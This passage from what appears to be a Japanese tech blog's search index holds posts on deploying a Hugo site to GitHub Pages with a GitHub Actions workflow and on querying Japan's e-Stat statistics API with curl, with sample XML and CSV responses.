Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-06T14:21:51+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-06-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-06-01-suzuki/","title":"シェルスクリプトをつかって、hugoで楽ちんにファイルを作成して編集できないかっていうはなし"},{"content":"デザイナーでもできるはじめてのHugoの2回目になります。\n前回（デザイナーでもできるはじめてのHugo #01）はHugoのインストールから公開の方法までを説明しました。\n今回は前回作成したページをGitHub Pagesを使って公開してみたいと思います。\nGitHub Pages用の設定ファイルを作成 GitHub PagesはGitHubにあるコンテンツを静的ページを公開する機能です。\nSSLまでついているので、非常に便利です。\n公開用のファイルは.github/workflows/gh-pages.ymlというYAML形式のファイルになります。\nname: Hugo on: push: # schedule: # - cron: \u0026#39;*/10 * * * *\u0026#39; jobs: gh-pages: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v2 with: persist-credentials: false submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod # https://github.com/marketplace/actions/github-pages-action - name: Setup uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#39;latest\u0026#39; extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_branch: gh-pages nameはGitHubでのActionsに表示される名前です。\n今回は公開用としてgh-pagesというブランチにわけています。ここおらへんはお好みで設定してください。\nhugoでテーマを使っている場合はsubmodules: trueとする必要があります。\nまた、Hugoで更新日をGitの日付と合わせたい場合はfetch-depth: 0として、Gitの履歴を取得するようにしましょう。\nGitHub Pagesの設定 GitHub PagesのURLはhttps://ユーザまたは組織名.github.io/リポジトリ名となります。\nGitHubでリポジトリを作成する際に「ユーザまたは組織名.github.io」とすると「https://ユーザまたは組織名.github.io」とすることができます。\nまずはさきほどのファイルを含めてサイト全体をGitにアップして、gh-pagesというブランチが作られるのを待ちましょう。\nその後に、setings \u0026gt; PagesにでGitHub Pagesの設定を行います。\nGitHub Pagesの設定 Your GitHub Pages site is currently being built from the gh-pages branch\nにあるBranchをgh-pagesに変更します。\n設定は以上です。\nHugoの初期設定であればpublishDir: publicとなっているので、GitHub Pagesではpublicがルートディレクトリとして公開されます。\n.gitignoreに「public」を除外するようにしておきましょう。\n/public /resources 最後に設定したURLへアクセスするとサイトが確認できると思います。\nまとめ GitHub Pagesを使えば、難しいサーバの設定などをすることなく、無料でSSL付きのサイトを公開することが可能です。\nいくつかの制限はありますが、すごく便利な機能なのでみなさんもぜひ使ってみてはいかがでしょうか。\n公開する際はパスワードなどの情報も一緒にアップしないよう、気をつけてください。\nオススメの書籍 いちばんやさしいGit\u0026amp;GitHubの教本 人気講師が教えるバージョン管理＆共有入門 「いちばんやさしい教本」シリーズ 実際のワークフローをイメージしながら 実践的なGit/GitHubの使い方が身につく「いちばんやさしい」入門書です。 前半は、手元のパソコンでファイルを実際にバージョン管理しながら、 Gitの基本的な使い方を解説。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 Web制作者のためのGitHubの教科書 チームの効率を最大化する共同開発ツール そろそろ「プルリ」しませんか?しくみを理解して使えば怖くない。リポジトリの作成から複数デザインの提示、「Pull Request」を使った分担作業まで、Webサイト制作を例に実践的なワークフローを身に付ける。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-28T12:07:19+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-28-hugo-02-ywat/settings_hub5e89b620d2afe5c10cf3894738f1203_124480_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-28-hugo-02-ywat/","title":"GitHub Pagesを使って無料でSSL付きのサイトを公開する"},{"content":"私のe-Statでのデータマイニングの現在の目的は以下の通りです\n大量の政府公開データの中から\n①面白そうなデータをピックアップする\n②データをわかりやすくサマライズする\n・列情報などを必要な項目に絞り込む\n・前年度比５倍とか急激な変化があった場合をピックアップできるようにする\n最終的にはこれらを自動でできるようにしたいです。\n今回は、まず①面白そうなデータをピックアップすることを目的にe-Statを見てみましょう。\nランキングページを見てみよう e-Statのトップページ（https://www.e-stat.go.jp/）の画面の下の方にランキングという欄があります。\nそのランキングの現在(2021/12/26)３位が「アイスクリーム」なんです。\nランキング アイスクリームが含まれるのはどんなデータか 「アイスクリーム」は柔らかめのキーワードなので面白いデータの予感がします。\n「アイスクリーム」が含まれるデータはどんなデータなんでしょうか？\nちょっと見てみましょう。\nhttps://www.e-stat.go.jp/stat-search?page=1\u0026query=%E3%82%A2%E3%82%A4%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%A0\u0026layout=dataset\nアイスクリーム 「アイスクリーム」が含まれるデータは7640件あるみたいです。\nちょっと多いですね。。。\n検索条件なのですが、提供分類、表題を検索　データベース、ファイル内を検索にチェックがついています。\n「検索のしかた」をみてみるとキーワードのOR検索やAND検索もできそうです。\n検索のしかた ちなみに検索キーワードでの絞り込みはAPI(統計表情報取得)でももちろんできます。\ncurl \u0026#34;https://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsList?appId=xxxxxxxxxx\u0026amp;searchWord=アイスクリーム\u0026#34; アイスクリームだと数が多すぎるので試しに「ガリガリ君」で検索してみましたが、0件でした。「ハーゲンダッツ」で検索したところ22件引っかかってきました。\nハーゲンダッツ 「ハーゲンダッツ」どこに出てくるのかなと思ってAPIを一通り叩いてみたのですがAPIの実行結果からは「ハーゲンダッツ」は見つけられませんでした。\nエクセル表示を見てみたところ、「銘柄」という項目に「バニラアイスクリーム，カップ入り（110mL入り），「ハーゲンダッツ バニラ」」とありました。\nどうも全国のアイスクリームの価格を「ハーゲンダッツ　バニラ」を基準に算出しているみたいです。\nexcel ちなみに、2020年だと１番安いのが長野市の221円で１番高いのが那覇市の300円でした。\n統計表 単にハーゲンダッツの価格ってだけだと少しパンチ力弱いかもしれませんね。。。\n個人的には明治のスーパーカップが１位でジャンボモナカが２位でとかアイスクリーム売れ筋ランキングとかの方が楽しいのですが、政府はそこまで調べてくれないですよね。\n小売統計調査とは 小売物価統計調査はお米の価格から葬儀代まで約８００の小売価格を調査したデータ\n調査結果は、年金等の給付見直しの際の基礎資料や、公共料金の上限値を決める際の資料として、幅広く利用されているそうです。\nアイスクリームは約８００ある中の項目の一つです。\n銘柄 小売物価統計調査をピックアップするとしたら、ここ数年で値段が大きく変化しているものや地域間の差が特に大きいものとかですかね。\n「小売物価統計」でgoogle検索して面白そうな記事を見てみると\n「今年のX’マスケーキは小さくなるか」という記事がありました。\nケーキにもよく使われる小麦や油量種子はとりわけ高騰が目立つ\n→\n小売物価統計調査によると、東京都区部の小売価格で、今年11月の1kgあたりの小麦価格は1年前より約20円上昇した。食用油に至っては1kgあたり約60円と大幅な値上がりで、価格が比較的安定している食品の代名詞ともなってきた鶏卵でさえ、1パックあたり約12円上昇した。\n→\nクリスマスイブにケーキを買って帰る人も多いだろうが、今年は例年と比べて値段がほとんど同じなのにサイズが小さくなっていても不思議ではない。\nこんな感じのものは自動的にピックアップできると理想的なんですけどね。\n今日のところのまとめ 自動的にピックアップするとしたら\n・柔らかめのキーワード\n・ここ数年間で値が急激に変化してるもの\n・地域間の格差が大きいもの\nですかね。データを見ていって判定項目を増やしていきたいと思います。\nその他、アイスクリームでの検索結果には「家計調査」というのもありました。\n家計の４半期での支出額の平均を出したものなのですが、アイスクリームの支出は当然夏が冬の倍くらい多い感じになってます。\nアイスクリームは当たり前ですが、その他季節によって大きく支出が違うものって何なのかは少し興味がありますね。\n毎月や四半期ごとに値があるものについては、期間によって差が大きいものはピックアップしても良いかもしれませんね。\n家計調査 ","date":"2021-12-26T21:54:39+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/anal_hu1fa49663358d8289c9aaa2b108c2bef9_133702_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/","title":"e-Statで面白いデータを探そう。ランキング上位「アイスクリーム」ってなんだ？"},{"content":"今回は前回登場したデータの内容を調べてみましょう。\n「統計表情報取得」（リスト取得）APIで取得したデータをもとにe-Statのサイト（https://www.e-stat.go.jp/）からデータを見つけてみましょう。\n\u0026lt;LIST_INF id=\u0026#34;0003384123\u0026#34;\u0026gt; \u0026lt;STAT_NAME code=\u0026#34;00100409\u0026#34;\u0026gt;国民経済計算\u0026lt;/STAT_NAME\u0026gt; \u0026lt;GOV_ORG code=\u0026#34;00100\u0026#34;\u0026gt;内閣府\u0026lt;/GOV_ORG\u0026gt; \u0026lt;STATISTICS_NAME\u0026gt;四半期別ＧＤＰ速報 過去の値 1次速報値\u0026lt;/STATISTICS_NAME\u0026gt; \u0026lt;TITLE\u0026gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）\u0026lt;/TITLE\u0026gt; \u0026lt;CYCLE\u0026gt;四半期\u0026lt;/CYCLE\u0026gt; \u0026lt;SURVEY_DATE\u0026gt;201007-201009\u0026lt;/SURVEY_DATE\u0026gt; \u0026lt;OPEN_DATE\u0026gt;2020-04-01\u0026lt;/OPEN_DATE\u0026gt; \u0026lt;SMALL_AREA\u0026gt;0\u0026lt;/SMALL_AREA\u0026gt; \u0026lt;/LIST_INF\u0026gt; データを検索してみよう IDで検索できるのが一番良いのですが、キーワード検索のテキストフィールドに入力して検索してもダメでした。\nしょうが無いので、TITLE全文「形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）」で検索しましたがでダメでした。\n少し削って、「形態別国内家計最終消費支出 年度デフレータ—　前年度比」 だと４０５件。\n多すぎるので、SURVEY_DATE、OPEN_DATEを使って調査年、調査月、公開年月で絞り込むと２件に絞り込めました。\nあとはSTATISTICS_NAMEで特定できました。\n詳細ページに行ってみましょう https://www.e-stat.go.jp/stat-search/database?page=1\u0026query=%E5%BD%A2%E6%85%8B%E5%88%A5%E5%9B%BD%E5%86%85%E5%AE%B6%E8%A8%88%E6%9C%80%E7%B5%82%E6%B6%88%E8%B2%BB%E6%94%AF%E5%87%BA%20%E5%B9%B4%E5%BA%A6%E3%83%87%E3%83%95%E3%83%AC%E3%83%BC%E3%82%BF%E2%80%94%E3%80%80%E5%89%8D%E5%B9%B4%E5%BA%A6%20%20%20%20%20%20%20\u0026layout=dataset\u0026year=20100\u0026month=23070900\u0026open_date=202004\u0026statdisp_id=0003384123\u0026metadata=1\u0026data=1\n上段が「統計表情報取得」の内容\n統計表情報 下段が「メタ情報取得」の内容見たいです。\nメタ情報取得 DBをクリックするとグラフが表示されました。\nグラフ 行情報が「1981年度、1982年度、1983年度。。。」\n列情報が「家計最終消費支出（再掲）、家計最終消費支出（再掲）_居住者家計の海外での直接購入、。。。」\nなんと、APIクリックすると丁寧にクエリを表示してくれました(API仕様書とか見る必要ないですね)。\nAPI フォーマットもXML,JSON,CSVが選べますね。\n私はCSVの方が扱いやすいのでこれからはCSVでダウンロードすることにします。\nappIdがカラに空になっているので追加してcurlで叩くだけでいいですね。至れり尽くりです。\ncurl \u0026#34;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003384123\u0026amp;metaGetFlg=Y\u0026amp;cntGetFlg=N\u0026amp;explanationGetFlg=Y\u0026amp;annotationGetFlg=Y\u0026amp;sectionHeaderFlg=1\u0026amp;replaceSpChars=0\u0026#34; \u0026#34;tab_code\u0026#34;,\u0026#34;表章項目\u0026#34;,\u0026#34;cat01_code\u0026#34;,\u0026#34;形態別国内家計最終消費支出\u0026#34;,\u0026#34;time_code\u0026#34;,\u0026#34;時間軸（年度）\u0026#34;,\u0026#34;unit\u0026#34;,\u0026#34;value\u0026#34;,\u0026#34;annotation\u0026#34; \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;家計最終消費支出（再掲）\u0026#34;,\u0026#34;1981100000\u0026#34;,\u0026#34;1981年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;3.8\u0026#34;,\u0026#34;\u0026#34; \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;家計最終消費支出（再掲）\u0026#34;,\u0026#34;1982100000\u0026#34;,\u0026#34;1982年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;2.3\u0026#34;,\u0026#34;\u0026#34; \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;家計最終消費支出（再掲）\u0026#34;,\u0026#34;1983100000\u0026#34;,\u0026#34;1983年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;\u0026#34; . . . \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;12\u0026#34;,\u0026#34;家計最終消費支出（再掲）_居住者家計の海外での直接購入\u0026#34;,\u0026#34;1981100000\u0026#34;,\u0026#34;1981年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;17.6\u0026#34;,\u0026#34;\u0026#34; \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;12\u0026#34;,\u0026#34;家計最終消費支出（再掲）_居住者家計の海外での直接購入\u0026#34;,\u0026#34;1982100000\u0026#34;,\u0026#34;1982年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;15.6\u0026#34;,\u0026#34;\u0026#34; \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;12\u0026#34;,\u0026#34;家計最終消費支出（再掲）_居住者家計の海外での直接購入\u0026#34;,\u0026#34;1983100000\u0026#34;,\u0026#34;1983年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;-1.8\u0026#34;,\u0026#34;\u0026#34; データの見方は？ DBで表示させた「統計表表示」と見比べてみると\nグラフ \u0026#34;17\u0026#34;,\u0026#34;前年度比\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;家計最終消費支出（再掲）\u0026#34;,\u0026#34;1981100000\u0026#34;,\u0026#34;1981年度\u0026#34;,\u0026#34;％\u0026#34;,\u0026#34;3.8\u0026#34;,\u0026#34;\u0026#34; が１行目「1981年度」の１列目「家計最終消費支出（再掲）」に該当するみたいですね。\n１セル、１行のデータ構造みたいですね。\n１列目の情報がしばらく続いて、全行終わると次は２列目の情報みたいな構成だということがわかりました。\n国民経済計算って何 このデータは国民経済計算を算出したものということですが、国民経済計算ってなんでしょう？\n内閣府のサイトによると\n国民経済計算は「四半期別ＧＤＰ速報」と「国民経済計算年次推計」の２つからなっている。「四半期別ＧＤＰ速報」は速報性を重視し、ＧＤＰをはじめとする支出側系列等を、年に８回四半期別に作成・公表している。「国民経済計算年次推計」は、生産・分配・支出・資本蓄積といったフロー面や、資産・負債といったストック面も含めて、年に１回作成・公表している。\nGDPを算出するための何かみたいですね。\ngoogleの検索結果を見てみると、国や地方自治体のサイトや経済学の解説サイトがメインで、たまに今年のGDPはどうだったという記事でちょっと書かれてたりしました。\n記事の中でちょっと気になったのは、\n日本では新型コロナウイルスの影響で個人消費が落ち込んでおり、貯蓄が増加傾向にあります。内閣府の国民経済計算によると、2020年に消費されずに貯蓄に回ったお金は、一律10万円の特別定額給付金の影響もあり、35.8兆円に達しました。この額は前年の5倍の水準です。\n所得に対する貯蓄の割合を示す家計貯蓄率は13.1%と19年度（3.7%）から大きく上昇した。\n前年度から比較して急激に大きくなったという部分(5倍も！)。こういうのは是非ピックアップしたいと思いました。\ne-Statでのマイニングの目的は とわ言え「国民経済計算」全般的に堅い感じですね。。。。\n私のe-Statマイニングの目的は大量の政府公開データに埋もれている中から人の興味を引きそうな面白そうなコンテンツをピックアップしてわかりやすくサマリーを表示することなのです。\nキーワードランキングを見てみると「アイスクリーム」「身長・体重の平均値」みたいな面白そうな柔らかめのコンテンツもあるんです。\nランキング 次回から、\n・e-Statの森の中から面白いコンテンツを見つけよう\n・うまくサマライズして表示しよう\n興味深い列情報に絞りたい\n前年度から５倍とか急激に変化した部分をピックアップして伝えたい\nという視点からe-Statを調査していきたいと思います。\n","date":"2021-12-25T21:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/","title":"e-Statのデータの見方"},{"content":"知識ゼロからのe-Statマイニング\n日頃から大量のデータを使ってデータマイニングしてみたいなと思って暇なときにサイトを巡回していたらe-Statという日本の統計が閲覧できる政府統計ポータルサイトを発見しました。\nアイスの売り上げから子供の平均身長まで大量の統計資料が公開されており、しかもAPIまであるすごいサイトです。 このe-Statをマイニングしてみようと思います。\nまずはAPIを叩くところまでやってみます。\nまずはアプリケーションIDを取得しよう APIを叩くにはアプリケーションIDが必要です。\nまずはアプリケーションIDを取得しましょう。\nアプリケーションIDを取得するにはユーザー登録が必要です。以下のURLから手順に従ってユーザー登録してください。\nhttps://www.e-stat.go.jp/mypage/user/preregister\nアプリケーションIDはログイン後マイページ内のAPI機能(アプリケーションID発行)で取得できます。\nhttps://www.e-stat.go.jp/mypage/view/api\n入力項目は名称、URL、概要の３つです。\n名称、概要は適当で大丈夫です。\nURLは、http://localhostだと私はダメだったのでこのサイトのURLを設定しました。\n発行ボタンを押すとappIdにアプリケーションIDが払い出されます。\nAPIを叩いてみよう APIの仕様は以下のURLに記載されています。\nhttps://www.e-stat.go.jp/api/api-info/e-stat-manual3-0\n難しいです。\nなんとなく、「統計表情報取得」でリストを取得して、「メタ情報取得」「統計データ取得」で個別のデータを取得する感じでしょうか？\nまずは叩いてみます。\n統計表情報取得 curl \u0026#34;http://api.e-stat.go.jp/rest/1.0/app/getStatsList?appId=xxxxxxxxx\u0026amp;lang=J\u0026amp;searchKind=\u0026amp;searchWord=\u0026#34; \u0026lt;LIST_INF id=\u0026#34;0003384123\u0026#34;\u0026gt; \u0026lt;STAT_NAME code=\u0026#34;00100409\u0026#34;\u0026gt;国民経済計算\u0026lt;/STAT_NAME\u0026gt; \u0026lt;GOV_ORG code=\u0026#34;00100\u0026#34;\u0026gt;内閣府\u0026lt;/GOV_ORG\u0026gt; \u0026lt;STATISTICS_NAME\u0026gt;四半期別ＧＤＰ速報 過去の値 1次速報値\u0026lt;/STATISTICS_NAME\u0026gt; \u0026lt;TITLE\u0026gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）\u0026lt;/TITLE\u0026gt; \u0026lt;CYCLE\u0026gt;四半期\u0026lt;/CYCLE\u0026gt; \u0026lt;SURVEY_DATE\u0026gt;201007-201009\u0026lt;/SURVEY_DATE\u0026gt; \u0026lt;OPEN_DATE\u0026gt;2020-04-01\u0026lt;/OPEN_DATE\u0026gt; \u0026lt;SMALL_AREA\u0026gt;0\u0026lt;/SMALL_AREA\u0026gt; \u0026lt;/LIST_INF\u0026gt; LIST_INF idの「0003384123」」が個別データのidみたいです。これを使ってメタ情報取得、統計情報取得を呼び出します。\n##メタ情報取得\ncurl \u0026#34;http://api.e-stat.go.jp/rest/1.0/app/getMetaInfo?appId=xxxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003384123\u0026#34; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;GET_META_INFO xsi:noNamespaceSchemaLocation=\u0026#34;https://api.e-stat.go.jp/rest/1.0/schema/GetMetaInfo.xsd\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;RESULT\u0026gt; \u0026lt;STATUS\u0026gt;0\u0026lt;/STATUS\u0026gt; \u0026lt;ERROR_MSG\u0026gt;正常に終了しました。\u0026lt;/ERROR_MSG\u0026gt; \u0026lt;DATE\u0026gt;2021-12-24T18:35:07.926+09:00\u0026lt;/DATE\u0026gt; \u0026lt;/RESULT\u0026gt; \u0026lt;PARAMETER\u0026gt; \u0026lt;LANG\u0026gt;J\u0026lt;/LANG\u0026gt; \u0026lt;STATS_DATA_ID\u0026gt;0003384123\u0026lt;/STATS_DATA_ID\u0026gt; \u0026lt;/PARAMETER\u0026gt; \u0026lt;METADATA_INF\u0026gt; \u0026lt;TABLE_INF id=\u0026#34;0003384123\u0026#34;\u0026gt; \u0026lt;STAT_NAME code=\u0026#34;00100409\u0026#34;\u0026gt;国民経済計算\u0026lt;/STAT_NAME\u0026gt; \u0026lt;GOV_ORG code=\u0026#34;00100\u0026#34;\u0026gt;内閣府\u0026lt;/GOV_ORG\u0026gt; \u0026lt;STATISTICS_NAME\u0026gt;四半期別ＧＤＰ速報 過去の値 1次速報値\u0026lt;/STATISTICS_NAME\u0026gt; \u0026lt;TITLE\u0026gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）\u0026lt;/TITLE\u0026gt; \u0026lt;SURVEY_DATE\u0026gt;201007-201009\u0026lt;/SURVEY_DATE\u0026gt; \u0026lt;/TABLE_INF\u0026gt; \u0026lt;CLASS_INF\u0026gt; \u0026lt;CLASS_OBJ id=\u0026#34;tab\u0026#34; name=\u0026#34;表章項目\u0026#34; description=\u0026#34;Excelの書式設定で統計表の数値を\u0026amp;quot;-0.0\u0026amp;quot;としている場合、データベース上\u0026amp;quot;0.0\u0026amp;quot;として収録されているため、Excel統計表の数値とは必ずしも一致しない。\u0026#34;\u0026gt; \u0026lt;CLASS code=\u0026#34;17\u0026#34; name=\u0026#34;前年度比\u0026#34; level=\u0026#34;\u0026#34; unit=\u0026#34;％\u0026#34;/\u0026gt; \u0026lt;/CLASS_OBJ\u0026gt; \u0026lt;CLASS_OBJ id=\u0026#34;cat01\u0026#34; name=\u0026#34;形態別国内家計最終消費支出\u0026#34;\u0026gt; \u0026lt;CLASS code=\u0026#34;11\u0026#34; name=\u0026#34;家計最終消費支出（再掲）\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;12\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_居住者家計の海外での直接購入\u0026#34; level=\u0026#34;2\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;13\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_（控除）非居住者家計の国内での直接購入\u0026#34; level=\u0026#34;2\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;14\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_国内家計最終消費支出\u0026#34; level=\u0026#34;2\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;15\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_国内家計最終消費支出_耐久財\u0026#34; level=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;16\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_国内家計最終消費支出_半耐久財\u0026#34; level=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;17\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_国内家計最終消費支出_非耐久財\u0026#34; level=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;18\u0026#34; name=\u0026#34;家計最終消費支出（再掲）_国内家計最終消費支出_サービス\u0026#34; level=\u0026#34;3\u0026#34;/\u0026gt; \u0026lt;/CLASS_OBJ\u0026gt; \u0026lt;CLASS_OBJ id=\u0026#34;time\u0026#34; name=\u0026#34;時間軸（年度）\u0026#34;\u0026gt; \u0026lt;CLASS code=\u0026#34;1981100000\u0026#34; name=\u0026#34;1981年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1982100000\u0026#34; name=\u0026#34;1982年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1983100000\u0026#34; name=\u0026#34;1983年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1984100000\u0026#34; name=\u0026#34;1984年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1985100000\u0026#34; name=\u0026#34;1985年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1986100000\u0026#34; name=\u0026#34;1986年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1987100000\u0026#34; name=\u0026#34;1987年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1988100000\u0026#34; name=\u0026#34;1988年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;CLASS code=\u0026#34;1989100000\u0026#34; name=\u0026#34;1989年度\u0026#34; level=\u0026#34;1\u0026#34;/\u0026gt; 上の方がデータ内容の説明なのか？よくわかりません。\n統計情報取得 curl \u0026#34;http://api.e-stat.go.jp/rest/1.0/app/getStatsData?limit=10000\u0026amp;appId=xxxxxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003384123\u0026amp;metaGetFlg=N\u0026amp;cntGetFlg=N\u0026#34; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;GET_STATS_DATA xsi:noNamespaceSchemaLocation=\u0026#34;https://api.e-stat.go.jp/rest/1.0/schema/GetStatsData.xsd\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;RESULT\u0026gt; \u0026lt;STATUS\u0026gt;0\u0026lt;/STATUS\u0026gt; \u0026lt;ERROR_MSG\u0026gt;正常に終了しました。\u0026lt;/ERROR_MSG\u0026gt; \u0026lt;DATE\u0026gt;2021-12-24T18:37:22.156+09:00\u0026lt;/DATE\u0026gt; \u0026lt;/RESULT\u0026gt; \u0026lt;PARAMETER\u0026gt; \u0026lt;LANG\u0026gt;J\u0026lt;/LANG\u0026gt; \u0026lt;STATS_DATA_ID\u0026gt;0003384123\u0026lt;/STATS_DATA_ID\u0026gt; \u0026lt;DATA_FORMAT\u0026gt;X\u0026lt;/DATA_FORMAT\u0026gt; \u0026lt;START_POSITION\u0026gt;1\u0026lt;/START_POSITION\u0026gt; \u0026lt;LIMIT\u0026gt;10000\u0026lt;/LIMIT\u0026gt; \u0026lt;METAGET_FLG\u0026gt;N\u0026lt;/METAGET_FLG\u0026gt; \u0026lt;CNT_GET_FLG\u0026gt;N\u0026lt;/CNT_GET_FLG\u0026gt; \u0026lt;/PARAMETER\u0026gt; \u0026lt;STATISTICAL_DATA\u0026gt; \u0026lt;TABLE_INF id=\u0026#34;0003384123\u0026#34;\u0026gt; \u0026lt;STAT_NAME code=\u0026#34;00100409\u0026#34;\u0026gt;国民経済計算\u0026lt;/STAT_NAME\u0026gt; \u0026lt;GOV_ORG code=\u0026#34;00100\u0026#34;\u0026gt;内閣府\u0026lt;/GOV_ORG\u0026gt; \u0026lt;STATISTICS_NAME\u0026gt;四半期別ＧＤＰ速報 過去の値 1次速報値\u0026lt;/STATISTICS_NAME\u0026gt; \u0026lt;TITLE\u0026gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）\u0026lt;/TITLE\u0026gt; \u0026lt;SURVEY_DATE\u0026gt;201007-201009\u0026lt;/SURVEY_DATE\u0026gt; \u0026lt;TOTAL_NUMBER\u0026gt;232\u0026lt;/TOTAL_NUMBER\u0026gt; \u0026lt;FROM_NUMBER\u0026gt;1\u0026lt;/FROM_NUMBER\u0026gt; \u0026lt;TO_NUMBER\u0026gt;232\u0026lt;/TO_NUMBER\u0026gt; \u0026lt;/TABLE_INF\u0026gt; \u0026lt;DATA_INF\u0026gt; \u0026lt;NOTE char=\u0026#34;***\u0026#34;\u0026gt;数字が得られないもの\u0026lt;/NOTE\u0026gt; \u0026lt;NOTE char=\u0026#34;-\u0026#34;\u0026gt;数字が得られないもの\u0026lt;/NOTE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1981100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;3.8\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1982100000\u0026#34; 